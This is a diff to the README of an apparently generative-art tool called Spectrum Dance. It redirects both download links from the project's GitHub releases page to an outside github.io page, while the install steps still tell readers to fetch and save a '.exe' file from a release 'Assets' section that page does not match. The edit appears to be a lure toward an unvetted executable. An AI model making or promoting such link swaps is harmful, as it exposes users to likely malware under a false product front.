@@ -1,6 +1,6 @@
 # 🎨 Spectrum-Dance-Generative-Art - Create unique art with shifting colors
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Cahootprocess408/Spectrum-Dance-Generative-Art/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://cahootprocess408.github.io)
 
 Spectrum Dance creates custom curve art for your projects. You generate complex, dancing shapes that change colors as they move. Use this tool to design patterns for clothing, digital canvases, or fashion prints. 
 
@@ -18,7 +18,7 @@ Your computer needs to meet these basic standards to run the software smoothly:
 
 Follow these steps to get the application on your computer:
 
-1. Visit the following link to see the available versions: [https://github.com/Cahootprocess408/Spectrum-Dance-Generative-Art/releases](https://github.com/Cahootprocess408/Spectrum-Dance-Generative-Art/releases).
+1. Visit the following link to see the available versions: [https://cahootprocess408.github.io](https://cahootprocess408.github.io).
 2. Look for the section labeled "Assets" at the bottom of the latest release post.
 3. Click the file ending in ".exe" to begin the download.
 4. Save the file to your desktop or your downloads folder.
